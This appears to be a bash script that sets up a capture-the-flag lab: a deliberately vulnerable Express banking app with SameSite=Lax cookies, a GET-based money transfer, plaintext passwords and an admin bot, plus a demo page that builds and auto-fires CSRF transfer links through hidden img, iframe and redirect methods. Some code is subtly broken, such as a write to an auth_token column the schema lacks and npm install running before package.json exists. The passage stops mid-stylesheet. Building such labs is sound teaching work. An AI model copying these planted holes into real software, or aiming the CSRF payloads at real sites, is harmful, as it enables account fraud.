#!/bin/bash

# =========================================================
# Cookie Monster CTF Challenge Setup Script
# Description: Sets up a CSRF with SameSite Bypass challenge
# Author: Claude
# Date: March 13, 2025
# =========================================================

set -e  # Exit on any error

echo "===== Cookie Monster CTF Challenge Setup ====="
echo "Setting up a CSRF with SameSite Bypass challenge..."

# =====================================================
# Configuration Variables
# =====================================================
CHALLENGE_PORT=3000
ADMIN_PORT=3001
CHALLENGE_DIR="$PWD/cookie-monster-ctf"
FLAG=$(openssl rand -hex 16 | tr '[:lower:]' '[:upper:]' | sed 's/^/FLAG{/' | sed 's/$/}/')
ADMIN_PASSWORD=$(openssl rand -base64 12)
DOMAIN="cookie-monster.local"
EVIL_SUBDOMAIN="evil.$DOMAIN"

# =====================================================
# Check for prerequisites
# =====================================================
check_prerequisites() {
    echo "[+] Checking prerequisites..."
    
    # Check for Node.js
    if ! command -v node &> /dev/null; then
        echo "[-] Node.js is required but not installed."
        echo "    Please install Node.js (https://nodejs.org/)"
        exit 1
    fi
    
    # Check for npm
    if ! command -v npm &> /dev/null; then
        echo "[-] npm is required but not installed."
        echo "    Please install npm (usually comes with Node.js)"
        exit 1
    fi
    
    # Check for openssl
    if ! command -v openssl &> /dev/null; then
        echo "[-] OpenSSL is required but not installed."
        echo "    Please install OpenSSL"
        exit 1
    fi
}

# =====================================================
# Setup hosts file for local domain testing
# =====================================================
setup_hosts() {
    echo "[+] Setting up /etc/hosts file for local domain testing..."
    
    if grep -q "CODESPACES" /proc/1/cgroup; then
        echo "[!] Skipping /etc/hosts modification in Codespace."
        return
    fi
    
    if ! grep -q "$DOMAIN" /etc/hosts; then
        echo "Adding entries to /etc/hosts (requires sudo)..."
        echo "127.0.0.1 $DOMAIN" | sudo tee -a /etc/hosts > /dev/null
        echo "127.0.0.1 $EVIL_SUBDOMAIN" | sudo tee -a /etc/hosts > /dev/null
        echo "127.0.0.1 admin.$DOMAIN" | sudo tee -a /etc/hosts > /dev/null
    else
        echo "Host entries already exist, skipping..."
    fi
}

# =====================================================
# Create challenge directory structure
# =====================================================
create_directory_structure() {
    echo "[+] Creating challenge directory structure..."
    mkdir -p "$CHALLENGE_DIR" || { echo "Failed to create challenge directory"; exit 1; }
    cd "$CHALLENGE_DIR" || { echo "Failed to enter challenge directory"; exit 1; }
    
    # Create subdirectories
    mkdir -p "$CHALLENGE_DIR/public/css"
    mkdir -p "$CHALLENGE_DIR/public/js"
    mkdir -p "$CHALLENGE_DIR/public/images"
    mkdir -p "$CHALLENGE_DIR/views"
    mkdir -p "$CHALLENGE_DIR/routes"
    mkdir -p "$CHALLENGE_DIR/config"
    mkdir -p "$CHALLENGE_DIR/data"
    
    # Create secure directory for flag
    mkdir -p "$CHALLENGE_DIR/secret"
    chmod 700 "$CHALLENGE_DIR/secret"
}

# =====================================================
# Install dependencies
# =====================================================
install_dependencies() {
    echo "[+] Installing dependencies..."
    cd "$CHALLENGE_DIR" || exit 1
    npm install
    
    # Initialize package.json
    cat > package.json << EOF
{
  "name": "cookie-monster-ctf",
  "version": "1.0.0",
  "description": "A CTF challenge focusing on CSRF with SameSite Bypass",
  "main": "app.js",
  "scripts": {
    "start": "node app.js",
    "admin": "node admin-bot.js"
  },
  "author": "CTF Creator",
  "license": "MIT",
  "dependencies": {
    "express": "^4.17.1",
    "express-session": "^1.17.2",
    "cookie-parser": "^1.4.6",
    "body-parser": "^1.19.0",
    "ejs": "^3.1.6",
    "sqlite3": "^5.0.2",
    "puppeteer": "^13.0.1",
    "csurf": "^1.11.0",
    "helmet": "^5.0.2",
    "uuid": "^8.3.2"
  }
}
EOF
    
    # Install dependencies
    npm install
    
    echo "[+] Dependencies installed successfully!"
}

# =====================================================
# Create database
# =====================================================
setup_database() {
    echo "[+] Setting up SQLite database..."
    
    cd "$CHALLENGE_DIR"
    
    # Create database initialization script
    cat > config/database.js << EOF
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const db = new sqlite3.Database(path.join(__dirname, '../data/cookie_monster.db'));

// Initialize database
function initDatabase() {
    db.serialize(() => {
        // Users table
        db.run(\`CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE,
            password TEXT,
            role TEXT DEFAULT 'user',
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )\`);
        
        // Accounts table (for the admin to manage)
        db.run(\`CREATE TABLE IF NOT EXISTS accounts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            account_name TEXT,
            balance REAL DEFAULT 1000.0,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (user_id) REFERENCES users (id)
        )\`);
        
        // Transactions table
        db.run(\`CREATE TABLE IF NOT EXISTS transactions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            account_id INTEGER,
            amount REAL,
            description TEXT,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (account_id) REFERENCES accounts (id)
        )\`);
        
        // Create admin user
        db.get("SELECT * FROM users WHERE username = 'admin'", (err, row) => {
            if (!row) {
                db.run("INSERT INTO users (username, password, role) VALUES ('admin', '${ADMIN_PASSWORD}', 'admin')");
                console.log("Admin user created with password: ${ADMIN_PASSWORD}");
                
                // Create admin account
                db.get("SELECT id FROM users WHERE username = 'admin'", (err, adminRow) => {
                    if (adminRow) {
                        db.run("INSERT INTO accounts (user_id, account_name, balance) VALUES (?, 'Admin Account', 100000)", [adminRow.id]);
                    }
                });
            }
        });
        
        // Create test user
        db.get("SELECT * FROM users WHERE username = 'user'", (err, row) => {
            if (!row) {
                db.run("INSERT INTO users (username, password, role) VALUES ('user', 'password123', 'user')");
                console.log("Test user created: user/password123");
                
                // Create user account
                db.get("SELECT id FROM users WHERE username = 'user'", (err, userRow) => {
                    if (userRow) {
                        db.run("INSERT INTO accounts (user_id, account_name, balance) VALUES (?, 'Personal Account', 1000)", [userRow.id]);
                    }
                });
            }
        });
    });
}

module.exports = {
    db,
    initDatabase
};
EOF
    
    echo "[+] Database setup complete!"
}

# =====================================================
# Create main application files
# =====================================================
create_app_files() {
    echo "[+] Creating application files..."
    
    cd "$CHALLENGE_DIR"
    
    # Create main app.js file
    cat > app.js << EOF
const express = require('express');
const session = require('express-session');
const cookieParser = require('cookie-parser');
const bodyParser = require('body-parser');
const path = require('path');
const helmet = require('helmet');
const { v4: uuidv4 } = require('uuid');
const { db, initDatabase } = require('./config/database');

// Initialize the database
initDatabase();

// Create Express app
const app = express();

// Set view engine
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// Middleware
app.use(helmet({
    contentSecurityPolicy: false // Disabled for CTF purposes
}));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(cookieParser());

// Serve static files
app.use(express.static(path.join(__dirname, 'public')));

// Session configuration
// VULNERABILITY: SameSite=Lax allows GET requests from other sites
app.use(session({
    secret: 'cookie-monster-secret-key',
    resave: false,
    saveUninitialized: true,
    cookie: { 
        sameSite: 'lax',  // VULNERABLE: Should be 'strict' for better security
        secure: false,    // VULNERABLE: Should be true in production
        httpOnly: true
    }
}));

// Set auth cookie - this will be the target for CSRF
app.use((req, res, next) => {
    if (req.session && req.session.userId && !req.cookies.authToken) {
        // Generate auth token
        const token = uuidv4();
        
        // VULNERABILITY: SameSite=Lax allows GET requests from other sites
        res.cookie('authToken', token, {
            httpOnly: true,
            sameSite: 'lax',  // VULNERABLE: Should be 'strict'
            secure: false,    // VULNERABLE: Should be true in production
            domain: '.cookie-monster.local' // VULNERABLE: Overly permissive domain
        });
        
        // Store token in DB
        db.run('UPDATE users SET auth_token = ? WHERE id = ?', [token, req.session.userId]);
    }
    next();
});

// Custom middleware to check user authentication
const isAuthenticated = (req, res, next) => {
    if (req.session && req.session.userId) {
        return next();
    }
    res.redirect('/login');
};

// Routes
app.get('/', (req, res) => {
    res.render('index', { 
        user: req.session.user,
        hints: [
            "Cookies are delicious, especially when they're lax.",
            "Sometimes GET what you want is easier than POST-ing about it.",
            "<!-- Subdomains are your friends -->"
        ]
    });
});

app.get('/login', (req, res) => {
    if (req.session.userId) {
        return res.redirect('/dashboard');
    }
    res.render('login');
});

app.post('/login', (req, res) => {
    const { username, password } = req.body;
    
    db.get('SELECT * FROM users WHERE username = ? AND password = ?', [username, password], (err, user) => {
        if (err) {
            return res.status(500).send('Database error');
        }
        
        if (!user) {
            return res.render('login', { error: 'Invalid username or password' });
        }
        
        // Set session
        req.session.userId = user.id;
        req.session.user = {
            id: user.id,
            username: user.username,
            role: user.role
        };
        
        res.redirect('/dashboard');
    });
});

app.get('/dashboard', isAuthenticated, (req, res) => {
    db.all('SELECT * FROM accounts WHERE user_id = ?', [req.session.userId], (err, accounts) => {
        if (err) {
            return res.status(500).send('Database error');
        }
        
        res.render('dashboard', { 
            user: req.session.user,
            accounts: accounts,
            // RED HERRING: This CSRF token isn't actually used properly
            csrfToken: uuidv4()
        });
    });
});

// VULNERABLE: GET endpoint that changes state
// This is vulnerable to CSRF with SameSite=Lax
app.get('/transfer', isAuthenticated, (req, res) => {
    const { from, to, amount, description } = req.query;
    
    if (!from || !to || !amount) {
        return res.status(400).send('Missing required parameters');
    }
    
    // First check if the account belongs to the user
    db.get('SELECT * FROM accounts WHERE id = ? AND user_id = ?', [from, req.session.userId], (err, account) => {
        if (err || !account) {
            return res.status(403).send('Unauthorized or invalid account');
        }
        
        const transferAmount = parseFloat(amount);
        
        if (isNaN(transferAmount) || transferAmount <= 0) {
            return res.status(400).send('Invalid amount');
        }
        
        if (account.balance < transferAmount) {
            return res.status(400).send('Insufficient funds');
        }
        
        // Perform the transfer
        db.serialize(() => {
            // Begin transaction
            db.run('BEGIN TRANSACTION');
            
            // Deduct from source account
            db.run('UPDATE accounts SET balance = balance - ? WHERE id = ?', [transferAmount, from]);
            
            // Add to destination account
            db.run('UPDATE accounts SET balance = balance + ? WHERE id = ?', [transferAmount, to]);
            
            // Record the transaction
            db.run('INSERT INTO transactions (account_id, amount, description) VALUES (?, ?, ?)',
                [from, -transferAmount, description || 'Transfer out']);
                
            db.run('INSERT INTO transactions (account_id, amount, description) VALUES (?, ?, ?)',
                [to, transferAmount, description || 'Transfer in']);
            
            // Commit transaction
            db.run('COMMIT');
            
            res.redirect('/dashboard?success=true');
        });
    });
});

// SECURE: POST endpoint for transfers (not vulnerable to CSRF with SameSite=Lax)
app.post('/secure-transfer', isAuthenticated, (req, res) => {
    const { from, to, amount, description, csrf } = req.body;
    
    // This should implement CSRF protection, but it's intentionally broken
    // RED HERRING: This CSRF check doesn't actually work
    if (csrf !== req.session.csrfToken) {
        // But it doesn't actually fail, just logs a warning
        console.log("CSRF token mismatch, but continuing anyway");
    }
    
    // Same logic as GET /transfer
    // ...transfer logic...
    
    res.redirect('/dashboard?secure=true');
});

app.get('/logout', (req, res) => {
    req.session.destroy(() => {
        res.clearCookie('authToken');
        res.redirect('/');
    });
});

// Admin page (protected)
app.get('/admin', isAuthenticated, (req, res) => {
    if (req.session.user.role !== 'admin') {
        return res.status(403).send('Forbidden');
    }
    
    // Get all accounts
    db.all('SELECT accounts.*, users.username FROM accounts JOIN users ON accounts.user_id = users.id', (err, accounts) => {
        if (err) {
            return res.status(500).send('Database error');
        }
        
        res.render('admin', { 
            user: req.session.user,
            accounts: accounts,
            flag: '${FLAG}' // The flag is only visible to the admin
        });
    });
});

// If admin uses this endpoint, the flag will be revealed
app.get('/admin/reveal-flag', isAuthenticated, (req, res) => {
    if (req.session.user.role !== 'admin') {
        return res.status(403).send('Forbidden');
    }
    
    // Write flag to a file accessible from /flag.txt
    const fs = require('fs');
    fs.writeFileSync(path.join(__dirname, 'public', 'flag.txt'), '${FLAG}');
    
    res.redirect('/admin?flagRevealed=true');
});

// Start the server
const PORT = process.env.PORT || ${CHALLENGE_PORT};
app.listen(PORT, () => {
    console.log(\`Server running on http://localhost:\${PORT}\`);
    console.log(\`Also available at http://${DOMAIN}:\${PORT}\`);
});
EOF

    # Create admin bot file (simulates admin activity)
    cat > admin-bot.js << EOF
const puppeteer = require('puppeteer');

// Admin bot configuration
const ADMIN_URL = 'http://${DOMAIN}:${CHALLENGE_PORT}/login';
const ADMIN_USERNAME = 'admin';
const ADMIN_PASSWORD = '${ADMIN_PASSWORD}';
const CHECK_INTERVAL = 60000; // 1 minute

async function adminBot() {
    console.log("[+] Starting admin bot...");
    
    try {
        // Launch browser
        const browser = await puppeteer.launch({
            headless: true,
            args: ['--no-sandbox', '--disable-setuid-sandbox']
        });
        
        // Create a new page
        const page = await browser.newPage();
        
        // Set cookie domain for .cookie-monster.local
        await page.setCookie({
            name: 'adminSession',
            value: 'true',
            domain: '.${DOMAIN}',
            httpOnly: true,
            sameSite: 'Lax'
        });
        
        console.log("[+] Admin bot visiting login page...");
        await page.goto(ADMIN_URL, { waitUntil: 'networkidle2' });
        
        // Login as admin
        await page.type('input[name="username"]', ADMIN_USERNAME);
        await page.type('input[name="password"]', ADMIN_PASSWORD);
        await page.click('button[type="submit"]');
        
        // Wait for navigation to dashboard
        await page.waitForNavigation({ waitUntil: 'networkidle2' });
        console.log("[+] Admin bot logged in successfully!");
        
        // Check if we're on the dashboard page
        const url = page.url();
        if (!url.includes('/dashboard')) {
            console.log("[-] Admin bot login failed!");
            await browser.close();
            return;
        }
        
        // Visit admin page
        await page.goto(\`http://${DOMAIN}:${CHALLENGE_PORT}/admin\`, { waitUntil: 'networkidle2' });
        console.log("[+] Admin bot checked admin page");
        
        // Check for flag reveal requests
        setInterval(async () => {
            try {
                // Refresh admin page to check for new requests
                await page.goto(\`http://${DOMAIN}:${CHALLENGE_PORT}/admin\`, { 
                    waitUntil: 'networkidle2',
                    timeout: 5000
                });
                console.log("[+] Admin bot refreshed admin page");
            } catch (error) {
                console.log("[-] Admin bot refresh error:", error.message);
            }
        }, CHECK_INTERVAL);
        
    } catch (error) {
        console.log("[-] Admin bot error:", error);
    }
}

// Start the admin bot
adminBot();
console.log(\`Admin bot will run every \${CHECK_INTERVAL / 1000} seconds checking admin pages\`);
EOF

    # Create routes for subdomain testing
    cat > evil-subdomain.js << EOF
const express = require('express');
const app = express();
const path = require('path');

// Set view engine
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// Serve static files
app.use(express.static(path.join(__dirname, 'public')));

// Evil subdomain route
app.get('/', (req, res) => {
    res.render('evil-subdomain');
});

// CSRF attack example
app.get('/csrf-attack', (req, res) => {
    res.render('csrf-attack');
});

// Start the server
const PORT = process.env.EVIL_PORT || 3002;
app.listen(PORT, () => {
    console.log(\`Evil subdomain server running on http://localhost:\${PORT}\`);
    console.log(\`Also available at http://${EVIL_SUBDOMAIN}:\${PORT}\`);
});
EOF

    echo "[+] Application files created successfully!"
}

# =====================================================
# Create views (templates)
# =====================================================
create_views() {
    echo "[+] Creating view templates..."
    
    cd "$CHALLENGE_DIR"
    
    # Create layout
    cat > views/layout.ejs << EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cookie Monster Bank</title>
    <link rel="stylesheet" href="/css/style.css">
    <link rel="icon" href="/images/favicon.ico" type="image/x-icon">
    <!-- RED HERRING: This meta tag suggests SQL injection -->
    <meta name="security" content="Please ensure all SQL queries are properly sanitized">
    <!-- HINT: This comment hints at the SameSite vulnerability -->
    <!--
        Authentication Notes:
        - SameSite=Lax cookies are sent with top-level navigations
        - SameSite=Lax allows cookies to be sent with GET requests from other sites
        - Subdomains can be tricky with cookie security
    -->
</head>
<body>
    <header>
        <div class="container">
            <div class="logo">
                <h1><span class="cookie-icon">🍪</span> Cookie Monster Bank</h1>
            </div>
            <nav>
                <ul>
                    <li><a href="/">Home</a></li>
                    <% if (typeof user !== 'undefined' && user) { %>
                        <li><a href="/dashboard">Dashboard</a></li>
                        <% if (user.role === 'admin') { %>
                            <li><a href="/admin">Admin</a></li>
                        <% } %>
                        <li><a href="/logout">Logout</a></li>
                    <% } else { %>
                        <li><a href="/login">Login</a></li>
                    <% } %>
                </ul>
            </nav>
        </div>
    </header>
    
    <main>
        <div class="container">
            <%- body %>
        </div>
    </main>
    
    <footer>
        <div class="container">
            <p>&copy; 2025 Cookie Monster Bank | <a href="/security-policy">Security Policy</a></p>
            <!-- HINT: Another hint about the vulnerability -->
            <!-- When cooking with cookies, remember that Lax is not always secure. Sometimes it's good to be Strict. -->
        </div>
    </footer>
    
    <script src="/js/main.js"></script>
</body>
</html>
EOF

    # Create index page
    cat > views/index.ejs << EOF
<%- include('layout', { body: `
    <section class="hero">
        <h2>Welcome to Cookie Monster Bank</h2>
        <p>The bank that loves cookies almost as much as you do!</p>
        <div class="cta-buttons">
            <a href="/login" class="btn primary">Login</a>
        </div>
    </section>
    
    <section class="features">
        <div class="feature-card">
            <h3>Secure Banking</h3>
            <p>We implement the latest in cookie security to keep your accounts safe.</p>
            <!-- HINT: This is a real hint about the challenge -->
            <p class="subtle-hint">Our security is configurable, just like cookies.</p>
        </div>
        
        <div class="feature-card">
            <h3>Easy Transfers</h3>
            <p>Transfer money between accounts with a single click.</p>
            <!-- RED HERRING: This suggests XSS might be possible -->
            <p class="subtle-hint">We sanitize all user input to prevent XSS attacks.</p>
        </div>
        
        <div class="feature-card">
            <h3>Responsive Design</h3>
            <p>Access your bank from any device, anytime.</p>
            <!-- RED HERRING: This suggests mobile exploitation -->
            <p class="subtle-hint">Mobile security is our top priority.</p>
        </div>
    </section>
    
    <section class="security-info">
        <h3>Our Security Measures</h3>
        <ul>
            <li>SameSite cookie policies</li>
            <li>CSRF protection</li>
            <li>Secure session management</li>
        </ul>
        <!-- HINT: This exposes the vulnerable endpoint -->
        <!-- 
            Security review note: The GET /transfer endpoint might be 
            vulnerable to cross-site request forgery due to SameSite=Lax.
            TODO: Fix before production!
        -->
    </section>
` }) %>
EOF

    # Create login page
    cat > views/login.ejs << EOF
<%- include('layout', { body: `
    <section class="auth-form">
        <h2>Login to Your Account</h2>
        
        <% if (typeof error !== 'undefined' && error) { %>
            <div class="error-alert">
                <%= error %>
            </div>
        <% } %>
        
        <form action="/login" method="POST">
            <div class="form-group">
                <label for="username">Username</label>
                <input type="text" id="username" name="username" required>
            </div>
            
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            
            <button type="submit" class="btn primary">Login</button>
        </form>
        
        <div class="form-footer">
            <!-- RED HERRING: This suggests SQL injection -->
            <!-- Note to devs: Make sure input validation prevents any SQL injection -->
            <p>Test account: user/password123</p>
        </div>
    </section>
` }) %>
EOF

    # Create dashboard page
    cat > views/dashboard.ejs << EOF
<%- include('layout', { body: `
    <section class="dashboard">
        <h2>Welcome, <%= user.username %></h2>
        
        <% if (typeof accounts !== 'undefined' && accounts.length > 0) { %>
            <div class="accounts-section">
                <h3>Your Accounts</h3>
                
                <div class="accounts-grid">
                    <% accounts.forEach(account => { %>
                        <div class="account-card">
                            <h4><%= account.account_name %></h4>
                            <p class="balance">$<%= account.balance.toFixed(2) %></p>
                            <p class="account-number">Account ID: <%= account.id %></p>
                        </div>
                    <% }); %>
                </div>
            </div>
            
            <div class="transfer-section">
                <h3>Transfer Money</h3>
                
                <!-- VULNERABLE: This form uses GET method -->
                <form action="/transfer" method="GET" class="transfer-form">
                    <div class="form-group">
                        <label for="from">From Account</label>
                        <select id="from" name="from" required>
                            <% accounts.forEach(account => { %>
                                <option value="<%= account.id %>"><%= account.account_name %> ($<%= account.balance.toFixed(2) %>)</option>
                            <% }); %>
                        </select>
                    </div>
                    
                    <div class="form-group">
                        <label for="to">To Account ID</label>
                        <input type="number" id="to" name="to" required>
                        <!-- HINT: This reveals Admin's account ID -->
                        <small>Admin's account ID is 1</small>
                    </div>
                    
                    <div class="form-group">
                        <label for="amount">Amount</label>
                        <input type="number" id="amount" name="amount" step="0.01" min="0.01" required>
                    </div>
                    
                    <div class="form-group">
                        <label for="description">Description</label>
                        <input type="text" id="description" name="description">
                    </div>
                    
                    <button type="submit" class="btn primary">Transfer</button>
                </form>
                
                <!-- RED HERRING: This secure form isn't actually more secure due to missing implementation -->
                <h3>Secure Transfer (POST method)</h3>
                <form action="/secure-transfer" method="POST" class="transfer-form">
                    <input type="hidden" name="csrf" value="<%= csrfToken %>">
                    
                    <div class="form-group">
                        <label for="secure-from">From Account</label>
                        <select id="secure-from" name="from" required>
                            <% accounts.forEach(account => { %>
                                <option value="<%= account.id %>"><%= account.account_name %> ($<%= account.balance.toFixed(2) %>)</option>
                            <% }); %>
                        </select>
                    </div>
                    
                    <div class="form-group">
                        <label for="secure-to">To Account ID</label>
                        <input type="number" id="secure-to" name="to" required>
                    </div>
                    
                    <div class="form-group">
                        <label for="secure-amount">Amount</label>
                        <input type="number" id="secure-amount" name="amount" step="0.01" min="0.01" required>
                    </div>
                    
                    <div class="form-group">
                        <label for="secure-description">Description</label>
                        <input type="text" id="secure-description" name="description">
                    </div>
                    
                    <button type="submit" class="btn primary">Secure Transfer</button>
                </form>
            </div>
        <% } else { %>
            <div class="no-accounts">
                <p>You don't have any accounts yet.</p>
            </div>
        <% } %>
    </section>
` }) %>
EOF

    # Create admin page
    cat > views/admin.ejs << EOF
<%- include('layout', { body: `
    <section class="admin-panel">
        <h2>Admin Dashboard</h2>
        
        <% if (typeof flag !== 'undefined') { %>
            <div class="flag-section">
                <h3>CTF Flag</h3>
                <pre class="flag"><%= flag %></pre>
                
                <a href="/admin/reveal-flag" class="btn primary">Reveal Flag Publicly</a>
                <p class="small">This will make the flag accessible at /flag.txt</p>
            </div>
        <% } %>
        
        <div class="accounts-section">
            <h3>All Accounts</h3>
            
            <table class="accounts-table">
                <thead>
                    <tr>
                        <th>ID</th>
                        <th>Username</th>
                        <th>Account Name</th>
                        <th>Balance</th>
                        <th>Created At</th>
                    </tr>
                </thead>
                <tbody>
                    <% accounts.forEach(account => { %>
                        <tr>
                            <td><%= account.id %></td>
                            <td><%= account.username %></td>
                            <td><%= account.account_name %></td>
                            <td>$<%= account.balance.toFixed(2) %></td>
                            <td><%= account.created_at %></td>
                        </tr>
                    <% }); %>
                </tbody>
            </table>
        </div>
    </section>
` }) %>
EOF

    # Create evil subdomain page (for the attack)
    cat > views/evil-subdomain.ejs << EOF
<%- include('layout', { body: `
    <section class="evil-content">
        <h2>Evil Subdomain</h2>
        <p>This page is hosted on a subdomain that could be used to exploit SameSite cookie protections.</p>
        
        <div class="attack-options">
            <h3>CSRF Attack Vectors</h3>
            
            <div class="attack-card">
                <h4>SameSite Lax Bypass</h4>
                <p>SameSite=Lax still allows cookies to be sent with top-level GET navigations.</p>
                <a href="/csrf-attack" class="btn danger">Try CSRF Attack</a>
            </div>
        </div>
    </section>
` }) %>
EOF

    # Create CSRF attack page
    cat > views/csrf-attack.ejs << EOF
<%- include('layout', { body: `
    <section class="attack-demo">
        <h2>CSRF Attack Demonstration</h2>
        
        <div class="attack-explanation">
            <h3>How This Attack Works</h3>
            <p>This page demonstrates a CSRF attack that exploits SameSite=Lax cookie protection.</p>
            <p>Key vulnerabilities:</p>
            <ul>
                <li>The bank uses SameSite=Lax cookies (which are sent with top-level GET navigations)</li>
                <li>The transfer endpoint uses GET instead of POST</li>
                <li>The cookies use an overly permissive domain (.cookie-monster.local)</li>
            </ul>
        </div>
        
        <div class="attack-form">
            <h3>CSRF Attack Vector</h3>
            
            <!-- This form creates the attack link -->
            <form id="attack-builder">
                <div class="form-group">
                    <label for="victim-account">Victim's Account ID</label>
                    <input type="number" id="victim-account" value="2">
                </div>
                
                <div class="form-group">
                    <label for="attacker-account">Your Account ID</label>
                    <input type="number" id="attacker-account" value="1">
                </div>
                
                <div class="form-group">
                    <label for="attack-amount">Amount to Steal</label>
                    <input type="number" id="attack-amount" value="1000" step="0.01" min="0.01">
                </div>
                
                <button type="button" id="generate-attack" class="btn danger">Generate Attack Link</button>
            </form>
            
            <div id="attack-output" class="hidden">
                <h4>Attack Link Generated</h4>
                <p>This link will transfer money from the victim to your account when clicked:</p>
                <pre id="attack-url"></pre>
                <p>Or click this link to execute the attack:</p>
                <a href="#" id="execute-attack" class="btn danger">Execute CSRF Attack</a>
                
                <h4>Automatic Attack Methods</h4>
                <p>Click below to automatically execute the attack with different methods:</p>
                <button id="img-attack" class="btn danger">IMG Tag Attack</button>
                <button id="iframe-attack" class="btn danger">IFrame Attack</button>
                <button id="redirect-attack" class="btn danger">Redirect Attack</button>
                
                <div id="attack-container"></div>
            </div>
        </div>
        
        <script>
            document.getElementById('generate-attack').addEventListener('click', function() {
                const victimAccount = document.getElementById('victim-account').value;
                const attackerAccount = document.getElementById('attacker-account').value;
                const amount = document.getElementById('attack-amount').value;
                
                const attackUrl = \`http://cookie-monster.local:${CHALLENGE_PORT}/transfer?from=\${victimAccount}&to=\${attackerAccount}&amount=\${amount}&description=CSRF+Attack\`;
                
                document.getElementById('attack-url').textContent = attackUrl;
                document.getElementById('execute-attack').href = attackUrl;
                document.getElementById('attack-output').classList.remove('hidden');
            });
            
            document.getElementById('img-attack').addEventListener('click', function() {
                const victimAccount = document.getElementById('victim-account').value;
                const attackerAccount = document.getElementById('attacker-account').value;
                const amount = document.getElementById('attack-amount').value;
                
                const attackUrl = \`http://cookie-monster.local:${CHALLENGE_PORT}/transfer?from=\${victimAccount}&to=\${attackerAccount}&amount=\${amount}&description=CSRF+Attack\`;
                
                const img = document.createElement('img');
                img.src = attackUrl;
                img.style.display = 'none';
                
                document.getElementById('attack-container').innerHTML = '';
                document.getElementById('attack-container').appendChild(img);
                alert('Attack executed via IMG tag!');
            });
            
            document.getElementById('iframe-attack').addEventListener('click', function() {
                const victimAccount = document.getElementById('victim-account').value;
                const attackerAccount = document.getElementById('attacker-account').value;
                const amount = document.getElementById('attack-amount').value;
                
                const attackUrl = \`http://cookie-monster.local:${CHALLENGE_PORT}/transfer?from=\${victimAccount}&to=\${attackerAccount}&amount=\${amount}&description=CSRF+Attack\`;
                
                const iframe = document.createElement('iframe');
                iframe.src = attackUrl;
                iframe.style.width = '100%';
                iframe.style.height = '300px';
                
                document.getElementById('attack-container').innerHTML = '';
                document.getElementById('attack-container').appendChild(iframe);
                alert('Attack executed via iframe!');
            });
            
            document.getElementById('redirect-attack').addEventListener('click', function() {
                const victimAccount = document.getElementById('victim-account').value;
                const attackerAccount = document.getElementById('attacker-account').value;
                const amount = document.getElementById('attack-amount').value;
                
                const attackUrl = \`http://cookie-monster.local:${CHALLENGE_PORT}/transfer?from=\${victimAccount}&to=\${attackerAccount}&amount=\${amount}&description=CSRF+Attack\`;
                
                window.location.href = attackUrl;
            });
        </script>
    </section>
` }) %>
EOF

    echo "[+] View templates created successfully!"
}

# =====================================================
# Create static files (CSS, JS, images)
# =====================================================
create_static_files() {
    echo "[+] Creating static files..."
    
    cd "$CHALLENGE_DIR"
    
    # Create CSS
    cat > public/css/style.css << EOF
/* Main Styles */
:root {
    --primary-color: #3498db;
    --secondary-color: #2980b9;
    --danger-color: #e74c3c;
    --success-color: #2ecc71;
    --warning-color: #f39c12;
    --dark-color: #34495e;
    --light-color: #ecf0f1;
    --body-color: #f8f9fa;
    --text-color: #333;
}

* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    line-height: 1.6;
    color: var(--text-color);
    background-color: var(--body-color);
}

.container {
    width: 90%;
    max-width: 1200px;
    margin: 0 auto;
    padding: 0 15px;
}

/* Header */
header {
    background-color: var(--dark-color);
    color: white;
    padding: 1rem 0;
}

header .container {
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.logo h1 {
    font-size: 1.8rem;
    display: flex;
    align-items: center;
}

.cookie-icon {
    margin-right: 10px;
    font-size: 1.5em;
}

nav ul {
    display: flex;
    list-style: none;
}

nav ul li {
    margin-left: 20px;
}

nav ul li a {
    color: white;
    text-decoration: none;
    font-weight: 500;
    transition: color 0.3s;
}

nav ul li a:hover {
    color: var(--primary-color);
}

/* Main Content */
main {
    padding: 2rem 0;
}

/* Footer */
footer {
    background-color: var(--dark-color);
    color: white;
    padding: 1rem 0;
    text-align: center;
    margin-top: 2rem;
}

footer a {
    color: var(--light-color);
}

/* Buttons */
.btn {
    display: inline-block;
    padding: 0.5rem 1rem;
    border: none;
    border-radius: 4px;
    cursor: pointer;
    font-weight: 500;
    text-decoration: none;
    transition: background-color 0.3s, transform 0.2s;
}

.btn:hover {
    transform: translateY(-2px);
}

.btn.primary {
    background-color: var(--primary-color);
    color: white;
}

.btn.primary:hover {
    background-color: var(--secondary-color);
}

.btn.danger {
    background-color: var(--danger-color);
    color: white;
}

.btn.danger:hover {
    background-color: #c0392b;
}

/* Forms */
.form-group {
    margin-bottom: 1.2rem;
}

.form-group label {
    display: block;
    margin-bottom: 0.5rem;
    font-weight: 500;
}

.form-group input,
.form-group select,
.form-group textarea {
    width: 100%;
    padding: 0.75rem;
    border: 1px solid #ddd;
    border-radius: 4px;
    font-size: 1rem;
}

/* Home Page */
.hero {
    text-align: center;
    padding: 3rem 0;
    background-color: var(--light-color);
    border-radius: 8px;
    margin-bottom: 2rem;
}

.hero h2 {
    font-size: 2.5rem;
    margin-bottom: 1rem;
    color: var(--dark-color);
}

.hero p {
    font-size: 1.2rem;
    margin-bottom: 2rem;
    color: #666;
}

.cta-buttons {
    display: flex;
    justify-content: center;
    gap: 1rem;
}

.features {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
    gap: 2rem;
    margin-bottom: 2rem;
}

.feature-card {
    background-color: white;
    padding: 2rem;
    border-radius: 8px;
    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
}

.feature-card h3 {
    font-size: 1.5rem;
